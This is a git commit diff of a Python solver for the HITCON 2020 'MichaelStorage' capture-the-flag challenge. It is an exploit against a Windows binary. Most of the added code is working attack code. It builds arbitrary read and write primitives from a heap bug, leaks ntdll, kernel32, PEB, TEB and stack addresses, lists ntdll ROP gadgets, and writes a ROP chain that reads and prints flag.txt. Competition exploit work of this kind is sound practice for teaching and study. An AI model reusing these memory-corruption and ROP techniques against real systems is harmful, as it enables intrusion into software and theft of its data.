8a46599b7433bcef0388b86de8aa2a22f0d18b6f
SeungHyun Lee <xion@kaist.ac.kr>
2021-01-09 21:02:33 +0900

    Update completed MichaelStorage exp

--- 2020/HITCON_2020/MichaelStorage/solver.py
+++ 2020/HITCON_2020/MichaelStorage/solver.py
@@ -1,29 +1,17 @@
 import os, ctypes
 from pwintools import *
-from pdbparse.symlookup import Lookup
 
-def inject(pe, sym, name):
-    if name not in pe.symbols:
-        pe.symbols[name] = next(
-            sym.locs[base, limit][sym.names[base, limit].index(name)]
-            for base, limit in sym.addrs
-            if name in sym.names[base, limit]
-        )
-
-binary = PE(r'.\MichaelStorage.exe')
-ntdll = PE(r'.\dll\ntdll.dll')
-ntdll_sym = Lookup([(r'.\dll\ntdll.pdb', 0)])
-inject(ntdll, ntdll_sym, 'TlsExpansionBitMap')
-kernel32 = PE(r'.\dll\kernel32.dll')
+binary = PE('MichaelStorage.exe')
+ntdll = PE('../../dlls/System32/ntdll.dll', pdb='../../dlls/System32/ntdll.pdb')
+kernel32 = PE('../../dlls/System32/kernel32.dll')
 
 os.environ["_NO_DEBUG_HEAP"] = "1"
 
 DEBUG = False
 if DEBUG:
-    p = Process('.\MichaelStorage.exe')
-    binary.base = 0x00007FF763FD0000
+    p = Process('MichaelStorage.exe')
 else:
-    p = Remote('52.198.180.107', 56746)
+    p = Remote('localhost', 12345)
     p.timeout = 5000
 
 def start_debug():
@@ -134,9 +122,19 @@ seg_base = u64(getv(2).ljust(8, '\x00')) - 0x44118
 assert seg_base & 0xfffff == 0
 log.success('_HEAP_PAGE_SEGMENT: {:016x}'.format(seg_base))
 
-def AAR(addr):
+def AAR_unsafe(addr):
     RELW(0x340e8, addr)
-    return u64(getv(8).ljust(8, '\x00'))
+    return u64(getv(8)[:8].ljust(8, '\x00'))
+
+def AAR(addr):
+    val = 0
+    for i in reversed(range(8)):
+        val = (val << 8) | (AAR_unsafe(addr + i) & 0xff)
+    return val
+
+def AAW(addr, data):
+    RELW(0x340e8, addr)
+    setv(3, 8, data=data)
 
 heap_base = AAR(seg_base) - 0x148
 assert heap_base & 0xffff == 0
@@ -154,17 +152,136 @@ log.success('PEB: {:016x}'.format(peb))
 teb = peb + 0x1000
 log.info('TEB: {:016x}'.format(teb))
 
-stackbase = 0
-stacklimit = 0
-for i in reversed(range(6)):
-    stackbase  = (stackbase << 8) | (AAR(teb + 8 + i) & 0xff)
-    stacklimit = (stacklimit << 8) | (AAR(teb + 0x10 + i) & 0xff)
+stackbase = AAR(teb + 0x8)
+stacklimit = AAR(teb + 0x10)
 assert stackbase & 0xffff == 0 and stacklimit & 0xfff == 0
 log.success('StackBase:  {:016X}'.format(stackbase))
 log.success('StackLimit: {:016X}'.format(stacklimit))
 
-#start_debug()
+pattern = ntdll.base + ntdll.symbols['RtlUserThreadStart'] + 0x21
+probe, cnt = stackbase - 0x78, 0
+while stackbase - probe < 0x1000:
+    log.info('Probe #{} @ {:016X}'.format(cnt, probe))
+    if [AAR_unsafe, AAR][int('\0' in p64(pattern)[:6])](probe) == pattern:
+        log.success('Probing success!')
+        break
+    probe -= 8
+    cnt += 1
+else:
+    log.error('Probing failed...')
+    exit()
 
-## ROP or anything :)
+ret2main = probe - 8 * 22
+log.info('Stack addr returning to main: {:016X}'.format(ret2main))
+
+kernel32.base = AAR(probe - 8 * 6) - (kernel32.symbols['BaseThreadInitThunk'] + 0x14)
+assert kernel32.base & 0xffff == 0
+log.success('kernel32: {:016x}'.format(kernel32.base))
+binary.base = AAR(ret2main) - 0x209c
+assert binary.base & 0xffff == 0
+log.success('MichaelStorage: {:016x}'.format(binary.base))
+
+rop_start = ret2main + 8 * 6
+log.info('ROP start addr: {:016X}'.format(rop_start))
+
+"""
+ntdll gadgets
+0x01029 : ret
+0x8df3f : pop rcx ; ret
+0x8ef41 : xor r8d, r8d ; mov eax, r8d ; ret
+0x8b8f1 : pop rcx ; pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
+0x8b8f2 : pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
+0x8b8f7 : pop rdx ; pop r11 ; ret
+0x78b23 : mov qword ptr [rcx], rax ; ret
+0x8016b : xchg eax, ecx ; ret
+"""
+
+n = ntdll.base
+k = kernel32.base
+ret = n + 0x01029
+pop_rcx = n + 0x8df3f
+xor_r8 = n + 0x8ef41
+pop_rcx_r8_r9_r10_r11 = n + 0x8b8f1
+pop_r8_r9_r10_r11 = n + 0x8b8f2
+pop_rdx_r11 = n + 0x8b8f7
+mov_drcx_rax = n + 0x78b23
+xchg_eax_ecx = n + 0x8016b  # HANDLE is void*, but HFILE & GetStdHandle() results are int :)
+OpenFile = k + kernel32.symbols['OpenFile']
+ReadFile = k + kernel32.symbols['ReadFile']
+WriteFile = k + kernel32.symbols['WriteFile']
+GetStdHandle = k + kernel32.symbols['GetStdHandle']
+Sleep = k + kernel32.symbols['Sleep']
+flag = binary.base + 0x5850
+scratch = binary.base + 0x5950
+bytes_count = binary.base + 0x5b50
+
+payload = ''.join(map(p64, [
+    pop_rcx,             # aligned by 0x8
+    rop_start + 54 * 8,  # aligned by 0x10
+    pop_rdx_r11,
+    scratch,
+    0,
+    xor_r8,
+    ret,
+    OpenFile,
+    pop_rcx_r8_r9_r10_r11,
+    0,
+    0,
+    0,
+    0,
+    0,
+    xchg_eax_ecx,
+    pop_rdx_r11,
+    flag,
+    0,
+    pop_r8_r9_r10_r11,
+    0x100,
+    bytes_count,
+    0,
+    0,
+    ReadFile,
+    pop_rcx_r8_r9_r10_r11,
+    0,
+    0,
+    0,
+    0,
+    0,
+    ret,
+    pop_rcx,
+    (-11 & 0xffffffff),
+    GetStdHandle,
+    xchg_eax_ecx,
+    pop_rdx_r11,
+    flag,
+    0,
+    pop_r8_r9_r10_r11,
+    0x100,
+    bytes_count,
+    0,
+    0,
+    WriteFile,
+    pop_rcx_r8_r9_r10_r11,
+    0,
+    0,
+    0,
+    0,
+    0,
+    ret,
+    pop_rcx,
+    0xffffffff,
+    Sleep,
+    u64('flag.txt'),
+    0
+]))
+
+if rop_start + len(payload) > stackbase:
+    log.error('Not enough remaining space for ROP!')
+    exit()
+
+log.info('Writing ROP gadgets...')
+AAW(rop_start, payload)
+
+log.info('Triggering ROP...')
+AAW(ret2main, p64(pop_rcx_r8_r9_r10_r11))
 
 p.interactive()
